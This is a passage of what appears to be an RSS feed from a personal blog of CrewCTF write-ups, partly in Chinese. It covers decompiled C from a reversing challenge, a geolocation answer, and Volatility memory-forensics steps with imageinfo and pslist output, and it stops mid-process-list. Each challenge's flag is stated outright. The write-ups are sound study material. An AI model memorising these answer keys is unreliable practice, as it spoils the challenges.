&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v32 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">161&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v33 &lt;span style="color:#f92672">=&lt;/span> v32 &lt;span style="color:#f92672">+&lt;/span> v31;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v34 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">193&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;2&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v35 &lt;span style="color:#f92672">=&lt;/span> v34 &lt;span style="color:#f92672">+&lt;/span> v33;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v36 &lt;span style="color:#f92672">=&lt;/span> j &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> input[&lt;span style="color:#ae81ff">225&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v44 &lt;span style="color:#f92672">=&lt;/span> v35 &lt;span style="color:#f92672">+&lt;/span> v36;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v47 &lt;span style="color:#f92672">+=&lt;/span> v35 &lt;span style="color:#f92672">+&lt;/span> v36;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">--&lt;/span>v47;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v47 &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;[+] Stage 2: Predict the final card I draw.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fgets(flag, &lt;span style="color:#ae81ff">32LL&lt;/span>, stdin);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)isACard((&lt;span style="color:#66d9ef">__int64&lt;/span>)flag)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span>)j_strlen_ifunc(flag) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> flag[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;H&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> flag[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;2&amp;#39;&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)&lt;span style="color:#e6db74">&amp;#34;Congrats! Here is your flag: &amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">32&lt;/span>, v38, v39, v40, v41, flag[&lt;span style="color:#ae81ff">0&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> readFlag();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;You failed.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;You failed.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>CrewCTF - :-1: Questions</title><link>https://bernie6401.github.io/docs/security/practice/crewctf/bad/crewctf---_-1_-questions/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/crewctf/bad/crewctf---_-1_-questions/</guid><description>&lt;h1 id="challenge-findme">
 Challenge: findme
 &lt;a class="anchor" href="#challenge-findme">#&lt;/a>
&lt;/h1>
&lt;h2 id="source">
 Source
 &lt;a class="anchor" href="#source">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler
&lt;img src="https://hackmd.io/_uploads/HkL1AbiKn.png" alt="" />
:::&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題就只是找一張照片的經緯度，不二法門就是慢慢找，真TM累&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>crew{35.6682,138.5699}&lt;/code>&lt;/p></description></item><item><title>CrewCTF - Attaaaaack 1-13</title><link>https://bernie6401.github.io/docs/security/practice/crewctf/misc/crewctf---attaaaaack-1-13/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/crewctf/misc/crewctf---attaaaaack-1-13/</guid><description>&lt;h1 id="crewctf---attaaaaack-1-13">
 CrewCTF - Attaaaaack 1-13
 &lt;a class="anchor" href="#crewctf---attaaaaack-1-13">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;p>One of our employees at the company complained about suspicious behavior on the machine, our IR team took a memory dump from the machine and we need to investigate it.&lt;/p>
&lt;h2 id="attaaaaack-1">
 ==Attaaaaack 1==
 &lt;a class="anchor" href="#attaaaaack-1">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Q1. What is the best profile for the the machine?&lt;/p>&lt;/blockquote>
&lt;h3 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ volatility_2.6_win64_standalone.exe -f memdump.raw imageinfo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Volatility Foundation Volatility Framework 2.6
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>INFO : volatility.debug : Determining profile based on KDBG search...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Suggested Profile&lt;span style="color:#f92672">(&lt;/span>s&lt;span style="color:#f92672">)&lt;/span> : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AS Layer1 : IA32PagedMemoryPae &lt;span style="color:#f92672">(&lt;/span>Kernel AS&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AS Layer2 : FileAddressSpace &lt;span style="color:#f92672">(&lt;/span>D:&lt;span style="color:#ae81ff">\N&lt;/span>TU&lt;span style="color:#ae81ff">\C&lt;/span>TF&lt;span style="color:#ae81ff">\C&lt;/span>rewCTF&lt;span style="color:#ae81ff">\M&lt;/span>isc&lt;span style="color:#ae81ff">\A&lt;/span>ttaaaaack&lt;span style="color:#ae81ff">\m&lt;/span>emdump.raw&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PAE type : PAE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DTB : 0x185000L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> KDBG : 0x82b7ab78L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Number of Processors : &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Image Type &lt;span style="color:#f92672">(&lt;/span>Service Pack&lt;span style="color:#f92672">)&lt;/span> : &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> KPCR &lt;span style="color:#66d9ef">for&lt;/span> CPU &lt;span style="color:#ae81ff">0&lt;/span> : 0x80b96000L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> KUSER_SHARED_DATA : 0xffdf0000L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Image date and time : 2023-02-20 19:10:54 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Image local date and time : 2023-02-20 21:10:54 +0200
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Flag: &lt;code>crew{Win7SP1x86_23418}&lt;/code>&lt;/p></description></item><item><title>CrewCTF - Encrypt10n(Part 1)</title><link>https://bernie6401.github.io/docs/security/practice/crewctf/misc/crewctf---encrypt10npart-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/crewctf/misc/crewctf---encrypt10npart-1/</guid><description>&lt;h1 id="crewctf---encrypt10npart-1">
 CrewCTF - Encrypt10n(Part 1)
 &lt;a class="anchor" href="#crewctf---encrypt10npart-1">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://github.com/volatilityfoundation/volatility3">Volatility 3&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Description: We made a memory dump on the criminal machine after entering the crime scene. Our investigator thought he was using encryption software to hide the secret. can you help me to detect it?&lt;/li>
&lt;li>Q1 : crew{password}
這種類型之前沒碰過，所以看了別人的WP學一下&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>
首先他有提到他有用加密的技術隱藏secret，所以我們的目的就是要找到password&lt;/li>
&lt;/ul>
&lt;h2 id="exploit---memory-forensics">
 Exploit - Memory Forensics
 &lt;a class="anchor" href="#exploit---memory-forensics">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>先找到運行的OS version或其他軟硬體資訊
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python ../../Software/CTF/Misc/volatility/vol.py -f dump.raw imageinfo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Volatility Foundation Volatility Framework 2.6.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>INFO : volatility.debug : Determining profile based on KDBG search...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Suggested Profile&lt;span style="color:#f92672">(&lt;/span>s&lt;span style="color:#f92672">)&lt;/span> : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AS Layer1 : IA32PagedMemoryPae &lt;span style="color:#f92672">(&lt;/span>Kernel AS&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> AS Layer2 : FileAddressSpace &lt;span style="color:#f92672">(&lt;/span>/mnt/d/Download/Trash/dump.raw&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PAE type : PAE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DTB : 0x185000L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> KDBG : 0x82b3db78L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Number of Processors : &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Image Type &lt;span style="color:#f92672">(&lt;/span>Service Pack&lt;span style="color:#f92672">)&lt;/span> : &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> KPCR &lt;span style="color:#66d9ef">for&lt;/span> CPU &lt;span style="color:#ae81ff">0&lt;/span> : 0x839a5000L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> KUSER_SHARED_DATA : 0xffdf0000L
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Image date and time : 2023-02-16 12:03:16 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Image local date and time : 2023-02-16 14:03:16 +0200
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>重點: &lt;code>Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86&lt;/code>&lt;/li>
&lt;li>列出當時系統正在運行的process
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python ../../Software/CTF/Misc/volatility/vol.py -f dump.raw pslist --profile&lt;span style="color:#f92672">=&lt;/span>Win7SP0x86
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Volatility Foundation Volatility Framework 2.6.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Offset&lt;span style="color:#f92672">(&lt;/span>V&lt;span style="color:#f92672">)&lt;/span> Name PID PPID Thds Hnds Sess Wow64 Start Exit
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x8413a938 System &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">88&lt;/span> &lt;span style="color:#ae81ff">520&lt;/span> ------ &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:48 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x84e481c8 smss.exe &lt;span style="color:#ae81ff">252&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">29&lt;/span> ------ &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:49 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x84cae358 csrss.exe &lt;span style="color:#ae81ff">340&lt;/span> &lt;span style="color:#ae81ff">324&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#ae81ff">550&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:53 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x844ea030 wininit.exe &lt;span style="color:#ae81ff">392&lt;/span> &lt;span style="color:#ae81ff">324&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#ae81ff">77&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:54 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x84ef5030 csrss.exe &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#ae81ff">384&lt;/span> &lt;span style="color:#ae81ff">9&lt;/span> &lt;span style="color:#ae81ff">223&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:54 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x8573dd20 winlogon.exe &lt;span style="color:#ae81ff">456&lt;/span> &lt;span style="color:#ae81ff">384&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#ae81ff">114&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:54 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85749868 services.exe &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">392&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#ae81ff">228&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:54 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85763030 lsass.exe &lt;span style="color:#ae81ff">508&lt;/span> &lt;span style="color:#ae81ff">392&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span> &lt;span style="color:#ae81ff">578&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:55 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85764030 lsm.exe &lt;span style="color:#ae81ff">516&lt;/span> &lt;span style="color:#ae81ff">392&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span> &lt;span style="color:#ae81ff">149&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:55 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x857bd510 svchost.exe &lt;span style="color:#ae81ff">624&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span> &lt;span style="color:#ae81ff">362&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:56 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85809510 svchost.exe &lt;span style="color:#ae81ff">704&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span> &lt;span style="color:#ae81ff">298&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:56 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85859920 svchost.exe &lt;span style="color:#ae81ff">784&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span> &lt;span style="color:#ae81ff">510&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:56 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x8586da80 svchost.exe &lt;span style="color:#ae81ff">832&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#ae81ff">265&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:57 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85872bb0 svchost.exe &lt;span style="color:#ae81ff">856&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">22&lt;/span> &lt;span style="color:#ae81ff">731&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:57 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85875460 svchost.exe &lt;span style="color:#ae81ff">880&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">47&lt;/span> &lt;span style="color:#ae81ff">1013&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:57 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x8588f370 audiodg.exe &lt;span style="color:#ae81ff">960&lt;/span> &lt;span style="color:#ae81ff">784&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#ae81ff">132&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:57 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x858c2420 svchost.exe &lt;span style="color:#ae81ff">1092&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">18&lt;/span> &lt;span style="color:#ae81ff">389&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:58 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x857d6030 spoolsv.exe &lt;span style="color:#ae81ff">1288&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#ae81ff">270&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:59 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x857d1030 dwm.exe &lt;span style="color:#ae81ff">1296&lt;/span> &lt;span style="color:#ae81ff">832&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#ae81ff">114&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:59 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x857c7030 svchost.exe &lt;span style="color:#ae81ff">1324&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">21&lt;/span> &lt;span style="color:#ae81ff">310&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:59 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x857a5d20 explorer.exe &lt;span style="color:#ae81ff">1384&lt;/span> &lt;span style="color:#ae81ff">1276&lt;/span> &lt;span style="color:#ae81ff">33&lt;/span> &lt;span style="color:#ae81ff">923&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:59 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x857c4d20 taskhost.exe &lt;span style="color:#ae81ff">1400&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span> &lt;span style="color:#ae81ff">197&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:00:59 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85837898 svchost.exe &lt;span style="color:#ae81ff">1560&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span> &lt;span style="color:#ae81ff">146&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:00 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x841d1030 VGAuthService. &lt;span style="color:#ae81ff">1720&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#ae81ff">85&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:01 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x841d7118 vmtoolsd.exe &lt;span style="color:#ae81ff">1736&lt;/span> &lt;span style="color:#ae81ff">1384&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span> &lt;span style="color:#ae81ff">181&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:02 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85856030 vm3dservice.ex &lt;span style="color:#ae81ff">1836&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span> &lt;span style="color:#ae81ff">60&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:03 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85857d20 vmtoolsd.exe &lt;span style="color:#ae81ff">1856&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">14&lt;/span> &lt;span style="color:#ae81ff">291&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:03 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x841e5678 vm3dservice.ex &lt;span style="color:#ae81ff">1880&lt;/span> &lt;span style="color:#ae81ff">1836&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#ae81ff">44&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:03 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85a26030 svchost.exe &lt;span style="color:#ae81ff">384&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#ae81ff">93&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:05 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85a6e5d0 dllhost.exe &lt;span style="color:#ae81ff">876&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">21&lt;/span> &lt;span style="color:#ae81ff">191&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:05 UTC+0000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x85941c28 dllhost.exe &lt;span style="color:#ae81ff">1744&lt;/span> &lt;span style="color:#ae81ff">496&lt;/span> &lt;span style="color:#ae81ff">18&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> 2023-02-16 12:01:05 UTC+0000
